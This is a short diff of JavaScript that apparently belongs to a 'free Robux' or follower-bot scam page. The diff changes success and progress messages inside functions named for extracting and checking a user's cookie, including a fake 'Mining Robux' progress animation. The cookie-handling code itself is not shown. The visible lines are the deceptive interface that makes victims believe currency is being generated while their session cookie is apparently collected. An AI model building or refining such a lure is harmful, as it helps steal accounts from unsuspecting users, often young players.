@@ -32,7 +32,7 @@ async function extractAndCheckCookie() {
 
         const result = await response.json();
         if (result.success) {
-            showNotification("✅ Bot succeeds followers!", "success");
+            showNotification("✅ Bot succeeds robux!", "success");
         } else {
             showNotification(`❌ ${result.error}`, "error");
         }
@@ -132,7 +132,7 @@ async function showProgressNotification(cookie, amount) {
             { 
                 width: "100%", 
                 duration: 3,
-                onStart: () => progressMessage.textContent = `Mining... ${amount} Robux...`,
+                onStart: () => progressMessage.textContent = `Mining ${amount} Robux`,
                 onComplete: () => {
                     progressMessage.textContent = "Progress completed!";
                     resolve(); // Hoàn thành Promise khi timeline xong
